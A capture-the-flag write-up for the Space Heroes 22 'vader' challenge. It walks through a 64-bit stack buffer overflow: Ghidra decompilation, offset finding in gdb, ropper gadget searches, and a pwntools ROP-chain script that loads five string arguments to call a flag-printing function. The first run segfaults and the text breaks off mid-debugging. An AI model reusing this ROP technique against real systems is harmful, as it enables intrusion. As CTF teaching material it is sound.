### Binary Exploitation

### Source: Space Heroes 22

### Basic File Check 

```
                                                                                                        
┌──(venv)─(mark㉿haxor)-[~/…/Pentest/BOF/03-begineer_bof/vader]
└─$ file vader
vader: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=7d60f442a159c7fce6d6d5463b2200444210d82a, for GNU/Linux 3.2.0, not stripped
                                                                                                        
┌──(venv)─(mark㉿haxor)-[~/…/Pentest/BOF/03-begineer_bof/vader]
└─$ checksec vader
[!] Could not populate PLT: invalid syntax (unicorn.py, line 110)
[*] '/home/mark/Documents/Pentest/BOF/03-begineer_bof/vader/vader'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

We're working with a x64 binary. And its protection is only NX enabled.

I'll run it to know what it does

```
                                                                                                        
┌──(venv)─(mark㉿haxor)-[~/…/Pentest/BOF/03-begineer_bof/vader]
└─$ ./vader
MMMMMMMMMMMMMMMMMMMMMMMMMMMWXKOxdolc;',;;::llclodkOKNWMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMWXOoc;::::::;;;clkKNXxlcccc:::::cdOXWMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMWMMNkc,;clccc;,...    .:c:. ...,;:cccc:,,ckNMWMMMMMMMMMMMMMDARK
MMMMMMMMMMMMMMMMMMXx;;lol:'            .'.           .':loc',xNMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMW0:;dxlcc'            .dO;             .::lxo':0MMMMMMMMMMMMS1D3
MMMMMMMMMMMMMMMWk':Ol;x0c           ';oKK: .            cOo,dk;,OMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMO':Ol:0Xc            l0OXNc.l'            cKO;o0;,KMMMMMMMMMMMMOF
MMMMMMMMMMMMMMX:'Oo:KMd             o0ONWc'x,            .xM0:xk.lWMMMMMMMMMMMMM
MMMMMMMMMMMMMMx.okcOMMk.            o0OWMl'x;            .xMMklOc'OMMMMMMMMMMTH3
MMMMMMMMMMMMMWc'xldWMMWKx'          oOkNMo,x;          'oONMMWdod.oMMMMMMMMMMMMM
MMMMMMMMMMMMMK;:dl0MMMMMXc          lOxNMo'd;          lWMMMMMOld;:NMMMMMMMFORC3
MMMMMMMMMMMMMO':ldWMMMMWo           ckxNMd,d;          .kMMMMMNlc;,KMMMMMMMMMMMM
MMMMMMMMMMMMMk';cxMMMMMWOl:,.       cxxNMx;d;       .,;l0MMMMMWdc;'0MMMMMMMMMMMM
MMMMMMMMMMMMMx',cOMMMWXOxoc;.       cxxNMkcx:       .cdkOXWMMMMd:;'0MMMMMMMMMMMM
MMMMMMMMMMMMMx';;l0xl,.    .       ,0xdWMOcOx.           .,lkXWd:;'OMMMMMMMMMMMM
MMMMMMMMMMMMMd.ld:'    .',;::ccc:;,kWxxWMOlONo',:cc::,'...   'ood:'OMMMMMMMMMMMM
MMMMMMMMMMMMWl.xK:            .';coOXo:xxo:kKkl:;'.           .oXl.OMMMMMMMMMMMM
MMMMMMMMMMMM0';d'       .......',;;''.    ..'',;,'......        lo.lWMMMMMMMMMMM
MMMMMMMMMMMX:,l'        ..      .',:;lo. ;d:;:,..     ..         c:.xWMMMMMMMMMM
MMMMMMMMMMNc,o,                     '0XxoOWd.                    .l:,0MMMMMMMMMM
MMMMMMMMMWd,o;                      .xMNXWWc                      .o::XMMMMMMMMM
MMMMMMMMMk,oc                    .. .kXkdONc ..                    'd;oWMMMMMMMM
MMMMMMMM0;lo.         .;:,'....  'cxxo;'''cxxo:. ......';'          :x:xWMMMMMMM
MMMMMMMK:lx.           'xNNXXXKd;;::,.,l:..':c;,;xKKKXX0l.           oxcOMMMMMMM
MMMMMMXcck,         ..   ,cloool:. .lc,,'.cx, .';looooc.             .kxlKMMMMMM
MMMMMWoc0c      .'. .cdll;..',;lkOxxl:xOOxclddkkl:,''.';:cl'  ..      :KddNMMMMM
MMMMWxc0x.       :o; .xWWKkdodkKWMMKlxWMMMKdOMMWXkdoloONMXc .cc.      .dXdxWMMMM
MMMMOcOK;         'xd.'0MMMMMMMXk0Xc'dKXXKO:,0KkKWMMMMMMWo.;xl.        ,0XxOWMMM
MMM0lkNo           .xO;cXWWMWXd:dx; ;d;,:l:  ;xd:l0WMMMWx,oO;           oWKx0MMM
MMKokW0'            .dKdOWMNx;ckd:. lK,.cOd..lcdO:'oXMMKokO,            .OWKkXMM
MXdxN0;              .kWNWXc.,d;.do lK,.:kd.,0l.;o,.:KWNNK,              ;KW0kNM
NxdOc.                ,0MMd..;l''Oo lK,.;kd.;Ko .,,. lWMXc                'xXOOW
xd0d.                  ;KMO,.c0ocXk;xXocxK0cdNOcol'''dWWd.                 .o0kO
,xWX:                   :XXc.:oddxxxxxxddxxxxkkOko;.:KNd.                  'kN0l
.,dOkdoc:,'..            .'..,lxkox0OO0kxOOxOOddxl,..,,.              ..,:lkKOl.
x,...',;:cc::;,,'''...        .,;cdO0KKKXXKkdo:,,'.        ...'',,,,;;clllc;'..;
MNKOxdoolcc::;;;;. ..             ..,;:clc;..              ...,;;;,,'',;;:clox0N
MMMMMMMMMMMMMMMMW0;                                          'kKXXNNNWWMMMMMMMMM
MMMMMMMMMMMMMMMMMMNd,..          ........                .. .kWMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMWKxl;..       'okOOko:,..     ..  ....';lKWMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMXkdc'....   .,cc:,,'..  .'o0Oo:;:cokXMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMWXkdoc;''''',,;;:::::::ccllclx0NMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMWXkol:;,'.''''....,cokKWMMMMMMMMMMMMMMMMMMMMMMMMMMMM


 When I left you, I was but the learner. Now I am the master >>> lol
                                                                                                        
┌──(venv)─(mark㉿haxor)-[~/…/Pentest/BOF/03-begineer_bof/vader]
└─$ 
```

It prints out the header and receives out input

I'll decompile the binary using ghidra

Here's the main function

```

undefined8 main(void)

{
  char local_28 [32];
  
  print_darth();
  printf("\n\n When I left you, I was but the learner. Now I am the master >>> ");
  fgets(local_28,0x100,stdin);
  return 0;
}
```

We see it makes a call to the program header design then receives our input 

The problem is that we're allowed to give an input of 0x100 bytes whereas the buffer is only meant to hold up 32bytes making this a buffer overflow vulnerability

There's another function of this binary called vader

Here's the decompiled code

```

void vader(char *param_1,char *param_2,char *param_3,char *param_4,char *param_5)

{
  int iVar1;
  undefined8 local_38;
  undefined8 local_30;
  undefined8 local_28;
  undefined8 local_20;
  FILE *local_10;
  
  iVar1 = strcmp(param_1,"DARK");
  if (iVar1 == 0) {
    iVar1 = strcmp(param_2,"S1D3");
    if (iVar1 == 0) {
      iVar1 = strcmp(param_3,"OF");
      if (iVar1 == 0) {
        iVar1 = strcmp(param_4,"TH3");
        if (iVar1 == 0) {
          iVar1 = strcmp(param_5,"FORC3");
          if (iVar1 == 0) {
            local_38 = 0;
            local_30 = 0;
            local_28 = 0;
            local_20 = 0;
            local_10 = (FILE *)0x0;
            local_10 = fopen("flag.txt","r");
            fgets((char *)&local_38,0x30,local_10);
            printf("<<< %s\n",&local_38);
          }
        }
      }
    }
    else {
      printf("You are a wretched thing, of weakness and fear.");
    }
                    /* WARNING: Subroutine does not return */
    exit(1);
  }
  return;
}
```

We see it recieves 5 argument then does string compare of the value of each argument, and on success it prints the flag out

So basically this is a ret2win challenge but with parameters

I'll hop to gdb to get the offset

Setting a breakpoint at the leave call

```
┌──(venv)─(mark㉿haxor)-[~/…/Pentest/BOF/03-begineer_bof/vader]
└─$ gdb -q vader
GEF for linux ready, type `gef' to start, `gef config' to configure
90 commands loaded and 5 functions added for GDB 12.1 in 0.00ms using Python engine 3.11
Reading symbols from vader...
(No debugging symbols found in vader)
gef➤  disass main
Dump of assembler code for function main:
   0x00000000004015b5 <+0>:     push   rbp
   0x00000000004015b6 <+1>:     mov    rbp,rsp
   0x00000000004015b9 <+4>:     sub    rsp,0x20
   0x00000000004015bd <+8>:     mov    eax,0x0
   0x00000000004015c2 <+13>:    call   0x4011df <print_darth>
   0x00000000004015c7 <+18>:    lea    rax,[rip+0x195a]        # 0x402f28
   0x00000000004015ce <+25>:    mov    rdi,rax
   0x00000000004015d1 <+28>:    mov    eax,0x0
   0x00000000004015d6 <+33>:    call   0x401050 <printf@plt>
   0x00000000004015db <+38>:    mov    rdx,QWORD PTR [rip+0x3a8e]        # 0x405070 <stdin@GLIBC_2.2.5>
   0x00000000004015e2 <+45>:    lea    rax,[rbp-0x20]
   0x00000000004015e6 <+49>:    mov    esi,0x100
   0x00000000004015eb <+54>:    mov    rdi,rax
   0x00000000004015ee <+57>:    call   0x401060 <fgets@plt>
   0x00000000004015f3 <+62>:    mov    eax,0x0
   0x00000000004015f8 <+67>:    leave  
   0x00000000004015f9 <+68>:    ret    
End of assembler dump.
gef➤  b *main+67
Breakpoint 1 at 0x4015f8
gef➤  
```

Now i'll run it and give my input as 1234567890

```

gef➤  r
Starting program: /home/mark/Documents/Pentest/BOF/03-begineer_bof/vader/vader 
[*] Failed to find objfile or not a valid file format: [Errno 2] No such file or directory: 'system-supplied DSO at 0x7ffff7fc9000'
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
MMMMMMMMMMMMMMMMMMMMMMMMMMMWXKOxdolc;',;;::llclodkOKNWMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMWXOoc;::::::;;;clkKNXxlcccc:::::cdOXWMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMWMMNkc,;clccc;,...    .:c:. ...,;:cccc:,,ckNMWMMMMMMMMMMMMMDARK
MMMMMMMMMMMMMMMMMMXx;;lol:'            .'.           .':loc',xNMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMW0:;dxlcc'            .dO;             .::lxo':0MMMMMMMMMMMMS1D3
MMMMMMMMMMMMMMMWk':Ol;x0c           ';oKK: .            cOo,dk;,OMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMO':Ol:0Xc            l0OXNc.l'            cKO;o0;,KMMMMMMMMMMMMOF
MMMMMMMMMMMMMMX:'Oo:KMd             o0ONWc'x,            .xM0:xk.lWMMMMMMMMMMMMM
MMMMMMMMMMMMMMx.okcOMMk.            o0OWMl'x;            .xMMklOc'OMMMMMMMMMMTH3
MMMMMMMMMMMMMWc'xldWMMWKx'          oOkNMo,x;          'oONMMWdod.oMMMMMMMMMMMMM
MMMMMMMMMMMMMK;:dl0MMMMMXc          lOxNMo'd;          lWMMMMMOld;:NMMMMMMMFORC3
MMMMMMMMMMMMMO':ldWMMMMWo           ckxNMd,d;          .kMMMMMNlc;,KMMMMMMMMMMMM
MMMMMMMMMMMMMk';cxMMMMMWOl:,.       cxxNMx;d;       .,;l0MMMMMWdc;'0MMMMMMMMMMMM
MMMMMMMMMMMMMx',cOMMMWXOxoc;.       cxxNMkcx:       .cdkOXWMMMMd:;'0MMMMMMMMMMMM
MMMMMMMMMMMMMx';;l0xl,.    .       ,0xdWMOcOx.           .,lkXWd:;'OMMMMMMMMMMMM
MMMMMMMMMMMMMd.ld:'    .',;::ccc:;,kWxxWMOlONo',:cc::,'...   'ood:'OMMMMMMMMMMMM
MMMMMMMMMMMMWl.xK:            .';coOXo:xxo:kKkl:;'.           .oXl.OMMMMMMMMMMMM
MMMMMMMMMMMM0';d'       .......',;;''.    ..'',;,'......        lo.lWMMMMMMMMMMM
MMMMMMMMMMMX:,l'        ..      .',:;lo. ;d:;:,..     ..         c:.xWMMMMMMMMMM
MMMMMMMMMMNc,o,                     '0XxoOWd.                    .l:,0MMMMMMMMMM
MMMMMMMMMWd,o;                      .xMNXWWc                      .o::XMMMMMMMMM
MMMMMMMMMk,oc                    .. .kXkdONc ..                    'd;oWMMMMMMMM
MMMMMMMM0;lo.         .;:,'....  'cxxo;'''cxxo:. ......';'          :x:xWMMMMMMM
MMMMMMMK:lx.           'xNNXXXKd;;::,.,l:..':c;,;xKKKXX0l.           oxcOMMMMMMM
MMMMMMXcck,         ..   ,cloool:. .lc,,'.cx, .';looooc.             .kxlKMMMMMM
MMMMMWoc0c      .'. .cdll;..',;lkOxxl:xOOxclddkkl:,''.';:cl'  ..      :KddNMMMMM
MMMMWxc0x.       :o; .xWWKkdodkKWMMKlxWMMMKdOMMWXkdoloONMXc .cc.      .dXdxWMMMM
MMMMOcOK;         'xd.'0MMMMMMMXk0Xc'dKXXKO:,0KkKWMMMMMMWo.;xl.        ,0XxOWMMM
MMM0lkNo           .xO;cXWWMWXd:dx; ;d;,:l:  ;xd:l0WMMMWx,oO;           oWKx0MMM
MMKokW0'            .dKdOWMNx;ckd:. lK,.cOd..lcdO:'oXMMKokO,            .OWKkXMM
MXdxN0;              .kWNWXc.,d;.do lK,.:kd.,0l.;o,.:KWNNK,              ;KW0kNM
NxdOc.                ,0MMd..;l''Oo lK,.;kd.;Ko .,,. lWMXc                'xXOOW
xd0d.                  ;KMO,.c0ocXk;xXocxK0cdNOcol'''dWWd.                 .o0kO
,xWX:                   :XXc.:oddxxxxxxddxxxxkkOko;.:KNd.                  'kN0l
.,dOkdoc:,'..            .'..,lxkox0OO0kxOOxOOddxl,..,,.              ..,:lkKOl.
x,...',;:cc::;,,'''...        .,;cdO0KKKXXKkdo:,,'.        ...'',,,,;;clllc;'..;
MNKOxdoolcc::;;;;. ..             ..,;:clc;..              ...,;;;,,'',;;:clox0N
MMMMMMMMMMMMMMMMW0;                                          'kKXXNNNWWMMMMMMMMM
MMMMMMMMMMMMMMMMMMNd,..          ........                .. .kWMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMWKxl;..       'okOOko:,..     ..  ....';lKWMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMXkdc'....   .,cc:,,'..  .'o0Oo:;:cokXMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMWXkdoc;''''',,;;:::::::ccllclx0NMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMWXkol:;,'.''''....,cokKWMMMMMMMMMMMMMMMMMMMMMMMMMMMM


 When I left you, I was but the learner. Now I am the master >>> 1234567890

Breakpoint 1, 0x00000000004015f8 in main ()
[ Legend: Modified register | Code | Heap | Stack | String ]
───────────────────────────────────────────────────────────────────────────────────────── registers ────
$rax   : 0x0               
$rbx   : 0x007fffffffdf18  →  0x007fffffffe27e  →  "/home/mark/Documents/Pentest/BOF/03-begineer_bof/v[...]"
$rcx   : 0x007fffffffdde0  →  "1234567890\n"
$rdx   : 0xfbad208b        
$rsp   : 0x007fffffffdde0  →  "1234567890\n"
$rbp   : 0x007fffffffde00  →  0x0000000000000001
$rsi   : 0x007ffff7f9bb03  →  0xf9da20000000000a ("\n"?)
$rdi   : 0x007ffff7f9da20  →  0x0000000000000000
$rip   : 0x000000004015f8  →  <main+67> leave 
$r8    : 0x1               
$r9    : 0x0               
$r10   : 0x007ffff7dd20c0  →  0x00100022000048ef
$r11   : 0x246             
$r12   : 0x0               
$r13   : 0x007fffffffdf28  →  0x007fffffffe2bb  →  "COLORFGBG=15;0"
$r14   : 0x0               
$r15   : 0x007ffff7ffd020  →  0x007ffff7ffe2e0  →  0x0000000000000000
$eflags: [zero carry PARITY adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x33 $ss: 0x2b $ds: 0x00 $es: 0x00 $fs: 0x00 $gs: 0x00 
───────────────────────────────────────────────────────────────────────────────────────────── stack ────
0x007fffffffdde0│+0x0000: "1234567890\n"         ← $rcx, $rsp
0x007fffffffdde8│+0x0008: 0x007fff000a3039 ("90\n"?)
0x007fffffffddf0│+0x0010: 0x0000000000000000
0x007fffffffddf8│+0x0018: 0x007ffff7f9c680  →  0x00000000fbad2087
0x007fffffffde00│+0x0020: 0x0000000000000001     ← $rbp
0x007fffffffde08│+0x0028: 0x007ffff7df018a  →  <__libc_start_call_main+122> mov edi, eax
0x007fffffffde10│+0x0030: 0x007ffff7f985e0  →  0x0000000000000000
0x007fffffffde18│+0x0038: 0x000000004015b5  →  <main+0> push rbp
─────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
     0x4015eb <main+54>        mov    rdi, rax
     0x4015ee <main+57>        call   0x401060 <fgets@plt>
     0x4015f3 <main+62>        mov    eax, 0x0
 →   0x4015f8 <main+67>        leave  
     0x4015f9 <main+68>        ret    
     0x4015fa                  nop    WORD PTR [rax+rax*1+0x0]
     0x401600 <__libc_csu_init+0> push   r15
     0x401602 <__libc_csu_init+2> lea    r15, [rip+0x37ff]        # 0x404e08
     0x401609 <__libc_csu_init+9> push   r14
─────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "vader", stopped 0x4015f8 in main (), reason: BREAKPOINT
───────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x4015f8 → main()
────────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤
```

Searching for the input on the stack

```
gef➤  search-pattern 1234567890
[+] Searching '1234567890' in memory
[+] In '[stack]'(0x7ffffffde000-0x7ffffffff000), permission=rw-
  0x7fffffffdde0 - 0x7fffffffddec  →   "1234567890\n" 
gef➤  i f
Stack level 0, frame at 0x7fffffffde10:
 rip = 0x4015f8 in main; saved rip = 0x7ffff7df018a
 Arglist at 0x7fffffffde00, args: 
 Locals at 0x7fffffffde00, Previous frame's sp is 0x7fffffffde10
 Saved registers:
  rbp at 0x7fffffffde00, rip at 0x7fffffffde08
gef➤
```

Doing the math we get the offset `(0x7fffffffde08 - 0x7fffffffdde0 = 0x28)` 

So its time to make the exploit. We know what in x64 binary arguments are passed in via register unlike x86 which is stored on the stack

Here's what i mean

```
x64 linux arguments to a function are passed in via registers.
rdi:    First Argument
rsi:    Second Argument
rdx:    Third Argument
rcx:    Fourth Argument
r8:     Fifth Argument
r9:     Sixth Argument
```

So basically before we can give those argument we need to get this address which will be gotten by using ropper tool

And another thing is that we can't directly pass a string as an argument we need the hex value of it i.e the hex that strcmp does with 

That can be easily gotten by viewing it in ghidra
![image](https://user-images.githubusercontent.com/113513376/216748997-2d38ae69-f4e2-4e1f-9259-0da21572835d.png)


So with that gathered lets get the register address and i'll be using ropper

```
┌──(venv)─(mark㉿haxor)-[~/…/Pentest/BOF/03-begineer_bof/vader]
└─$ ropper --file vader --search "pop rdi"
[INFO] Load gadgets from cache
[LOAD] loading... 100%
[LOAD] removing double gadgets... 100%
[INFO] Searching for gadgets: pop rdi

[INFO] File: vader
0x000000000040165b: pop rdi; ret; 

┌──(venv)─(mark㉿haxor)-[~/…/Pentest/BOF/03-begineer_bof/vader]
└─$ ropper --file vader --search "pop rsi"
[INFO] Load gadgets from cache
[LOAD] loading... 100%
[LOAD] removing double gadgets... 100%
[INFO] Searching for gadgets: pop rsi

[INFO] File: vader
0x0000000000401659: pop rsi; pop r15; ret; 

┌──(venv)─(mark㉿haxor)-[~/…/Pentest/BOF/03-begineer_bof/vader]
└─$ ropper --file vader --search "pop rcx"
[INFO] Load gadgets from cache
[LOAD] loading... 100%
[LOAD] removing double gadgets... 100%
[INFO] Searching for gadgets: pop rcx

[INFO] File: vader
0x00000000004011d8: pop rcx; pop r8; ret; 
0x00000000004011cd: pop rcx; pop rdx; ret; 

venv)─(mark㉿haxor)-[~/…/Pentest/BOF/03-begineer_bof/vader]
└─$ ropper --file vader --search "pop r8"
[INFO] Load gadgets from cache
[LOAD] loading... 100%
[LOAD] removing double gadgets... 100%
[INFO] Searching for gadgets: pop r8

[INFO] File: vader
0x00000000004011d9: pop r8; ret; 
```

With this we have the address needed, also if you notices some address has extra calls i.e pop rcx; pop rdx; ret; pop rsi; pop r15; ret;

Ok now here's my exploit script

```
from pwn import *

#starts the process
io = process('./vader')

elf = ELF('./vader')
#rop gadgets
pop_rdi = p64(0x40165b)
pop_rsi_pop_15 = p64(0x401659)
pop_rcx_pop_rdx = p64(0x4011cd)
pop_r8 = p64(0x4011d9)

#hex values for strings 
DARK = 0x402ec9
S1D3 = 0x402ece
OF = 0x402ed3
TH3 = 0x402ed6
FORC3 = 0x402eda

param1 = p64(DARK) 
param2 = p64(S1D3)
param3 = p64(OF)
param4 = p64(TH3)
param5 = p64(FORC3)

#final payload
print(io.recvuntil('Now I am the master >>> '))
payload = ""
payload += b"A"*40
payload += pop_rdi 
payload += param1
payload += pop_rsi_pop_15
payload += param2 * 2 #occupy the pop_15 address
payload += pop_rcx_pop_rdx
payload += param4 + param3 #pop OF into rdx, pop TH3 into rcx
payload += pop_r8
payload += param5
payload += p64(elf.symbols['vader']) #since this is a non-stripped binary pwntool will lookup the address for me

io.sendline(payload)

io.interactive()
```

Now i'll run it

```
──(venv)─(mark㉿haxor)-[~/…/Pentest/BOF/03-begineer_bof/vader]
└─$ python2 exploit.py vader 
[+] Starting local process './vader': pid 161052
[!] Could not populate PLT: invalid syntax (unicorn.py, line 110)
[*] '/home/mark/Documents/Pentest/BOF/03-begineer_bof/vader/vader'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
MMMMMMMMMMMMMMMMMMMMMMMMMMMWXKOxdolc;',;;::llclodkOKNWMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMWXOoc;::::::;;;clkKNXxlcccc:::::cdOXWMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMWMMNkc,;clccc;,...    .:c:. ...,;:cccc:,,ckNMWMMMMMMMMMMMMMDARK
MMMMMMMMMMMMMMMMMMXx;;lol:'            .'.           .':loc',xNMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMW0:;dxlcc'            .dO;             .::lxo':0MMMMMMMMMMMMS1D3
MMMMMMMMMMMMMMMWk':Ol;x0c           ';oKK: .            cOo,dk;,OMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMO':Ol:0Xc            l0OXNc.l'            cKO;o0;,KMMMMMMMMMMMMOF
MMMMMMMMMMMMMMX:'Oo:KMd             o0ONWc'x,            .xM0:xk.lWMMMMMMMMMMMMM
MMMMMMMMMMMMMMx.okcOMMk.            o0OWMl'x;            .xMMklOc'OMMMMMMMMMMTH3
MMMMMMMMMMMMMWc'xldWMMWKx'          oOkNMo,x;          'oONMMWdod.oMMMMMMMMMMMMM
MMMMMMMMMMMMMK;:dl0MMMMMXc          lOxNMo'd;          lWMMMMMOld;:NMMMMMMMFORC3
MMMMMMMMMMMMMO':ldWMMMMWo           ckxNMd,d;          .kMMMMMNlc;,KMMMMMMMMMMMM
MMMMMMMMMMMMMk';cxMMMMMWOl:,.       cxxNMx;d;       .,;l0MMMMMWdc;'0MMMMMMMMMMMM
MMMMMMMMMMMMMx',cOMMMWXOxoc;.       cxxNMkcx:       .cdkOXWMMMMd:;'0MMMMMMMMMMMM
MMMMMMMMMMMMMx';;l0xl,.    .       ,0xdWMOcOx.           .,lkXWd:;'OMMMMMMMMMMMM
MMMMMMMMMMMMMd.ld:'    .',;::ccc:;,kWxxWMOlONo',:cc::,'...   'ood:'OMMMMMMMMMMMM
MMMMMMMMMMMMWl.xK:            .';coOXo:xxo:kKkl:;'.           .oXl.OMMMMMMMMMMMM
MMMMMMMMMMMM0';d'       .......',;;''.    ..'',;,'......        lo.lWMMMMMMMMMMM
MMMMMMMMMMMX:,l'        ..      .',:;lo. ;d:;:,..     ..         c:.xWMMMMMMMMMM
MMMMMMMMMMNc,o,                     '0XxoOWd.                    .l:,0MMMMMMMMMM
MMMMMMMMMWd,o;                      .xMNXWWc                      .o::XMMMMMMMMM
MMMMMMMMMk,oc                    .. .kXkdONc ..                    'd;oWMMMMMMMM
MMMMMMMM0;lo.         .;:,'....  'cxxo;'''cxxo:. ......';'          :x:xWMMMMMMM
MMMMMMMK:lx.           'xNNXXXKd;;::,.,l:..':c;,;xKKKXX0l.           oxcOMMMMMMM
MMMMMMXcck,         ..   ,cloool:. .lc,,'.cx, .';looooc.             .kxlKMMMMMM
MMMMMWoc0c      .'. .cdll;..',;lkOxxl:xOOxclddkkl:,''.';:cl'  ..      :KddNMMMMM
MMMMWxc0x.       :o; .xWWKkdodkKWMMKlxWMMMKdOMMWXkdoloONMXc .cc.      .dXdxWMMMM
MMMMOcOK;         'xd.'0MMMMMMMXk0Xc'dKXXKO:,0KkKWMMMMMMWo.;xl.        ,0XxOWMMM
MMM0lkNo           .xO;cXWWMWXd:dx; ;d;,:l:  ;xd:l0WMMMWx,oO;           oWKx0MMM
MMKokW0'            .dKdOWMNx;ckd:. lK,.cOd..lcdO:'oXMMKokO,            .OWKkXMM
MXdxN0;              .kWNWXc.,d;.do lK,.:kd.,0l.;o,.:KWNNK,              ;KW0kNM
NxdOc.                ,0MMd..;l''Oo lK,.;kd.;Ko .,,. lWMXc                'xXOOW
xd0d.                  ;KMO,.c0ocXk;xXocxK0cdNOcol'''dWWd.                 .o0kO
,xWX:                   :XXc.:oddxxxxxxddxxxxkkOko;.:KNd.                  'kN0l
.,dOkdoc:,'..            .'..,lxkox0OO0kxOOxOOddxl,..,,.              ..,:lkKOl.
x,...',;:cc::;,,'''...        .,;cdO0KKKXXKkdo:,,'.        ...'',,,,;;clllc;'..;
MNKOxdoolcc::;;;;. ..             ..,;:clc;..              ...,;;;,,'',;;:clox0N
MMMMMMMMMMMMMMMMW0;                                          'kKXXNNNWWMMMMMMMMM
MMMMMMMMMMMMMMMMMMNd,..          ........                .. .kWMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMWKxl;..       'okOOko:,..     ..  ....';lKWMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMXkdc'....   .,cc:,,'..  .'o0Oo:;:cokXMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMWXkdoc;''''',,;;:::::::ccllclx0NMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMWXkol:;,'.''''....,cokKWMMMMMMMMMMMMMMMMMMMMMMMMMMMM


 When I left you, I was but the learner. Now I am the master >>> 
[*] Switching to interactive mode
[*] Got EOF while reading in interactive
$ 
[*] Process './vader' stopped with exit code -11 (SIGSEGV) (pid 161052)
[*] Got EOF while sending in interactive
```

I get an error this is weird my exploit is correct :\ 

Time to debug

I'll attach gdb to the process and set a breakpoint at the leave call in main and continue 

Here's the edited script

```
from pwn import *

#starts the process
io = process('./vader')
gdb.attach(io, gdbscript='b *main+67\nc')

elf = ELF('./vader')
#rop gadgets
pop_rdi = p64(0x40165b)
pop_rsi_pop_15 = p64(0x401659)
pop_rcx_pop_rdx = p64(0x4011cd)
pop_r8 = p64(0x4011d9)

#hex values for strings 
DARK = 0x402ec9
S1D3 = 0x402ece
OF = 0x402ed3
TH3 = 0x402ed6
FORC3 = 0x402eda

param1 = p64(DARK) 
param2 = p64(S1D3)
param3 = p64(OF)
param4 = p64(TH3)
param5 = p64(FORC3)

#final payload
print(io.recvuntil('Now I am the master >>> '))
payload = ""
payload += b"A"*40
payload += pop_rdi 
payload += param1
payload += pop_rsi_pop_15
payload += param2 * 2 #occupy the pop_15 address
payload += pop_rcx_pop_rdx
payload += param4 + param3 #pop OF into rdx, pop TH3 into rcx
payload += pop_r8
payload += param5
payload += p64(elf.symbols['vader']) #since this is a non-stripped binary pwntool will lookup the address for me

io.sendline(payload)

io.interactive()

```

On running it we get a gdb session

```
[ Legend: Modified register | Code | Heap | Stack | String ]
 registers ────
$rax   : 0xfffffffffffffe00
$rbx   : 0x007ffff7f9ba80  →  0x00000000fbad208b
$rcx   : 0x007ffff7ec102d  →  0x5b77fffff0003d48 ("H="?)
$rdx   : 0x1               
$rsp   : 0x007fffffffdd78  →  0x007ffff7e4b00e  →  <_IO_file_underflow+382> test rax, rax
$rbp   : 0x007ffff7f985e0  →  0x0000000000000000
$rsi   : 0x007ffff7f9bb03  →  0xf9da200000000000
$rdi   : 0x0               
$rip   : 0x007ffff7ec102d  →  0x5b77fffff0003d48 ("H="?)
$r8    : 0x1               
$r9    : 0x0               
$r10   : 0x007ffff7dd20c0  →  0x00100022000048ef
$r11   : 0x246             
$r12   : 0x007ffff7f9c760  →  0x00000000fbad2887
$r13   : 0xd68             
$r14   : 0x007ffff7f979e0  →  0x0000000000000000
$r15   : 0xd68             
$eflags: [ZERO carry PARITY adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x33 $ss: 0x2b $ds: 0x00 $es: 0x00 $fs: 0x00 $gs: 0x00 
 stack ────
0x007fffffffdd78│+0x0000: 0x007ffff7e4b00e  →  <_IO_file_underflow+382> test rax, rax    ← $rsp
0x007fffffffdd80│+0x0008: 0x0000000000000000
0x007fffffffdd88│+0x0010: 0x007fffffffdfc8  →  0x007fffffffe311  →  0x5245545f5353454c
0x007fffffffdd90│+0x0018: 0x0000000000000000
0x007fffffffdd98│+0x0020: 0x007ffff7f9ba80  →  0x00000000fbad208b
0x007fffffffdda0│+0x0028: 0x007ffff7f985e0  →  0x0000000000000000
0x007fffffffdda8│+0x0030: 0x0000000000000a ("\n"?)
0x007fffffffddb0│+0x0038: 0x00000000000000ff
 code:x86:64 ────
   0x7ffff7ec1027 <read+7>         je     0x7ffff7ec1040 <__GI___libc_read+32>
   0x7ffff7ec1029 <read+9>         xor    eax, eax
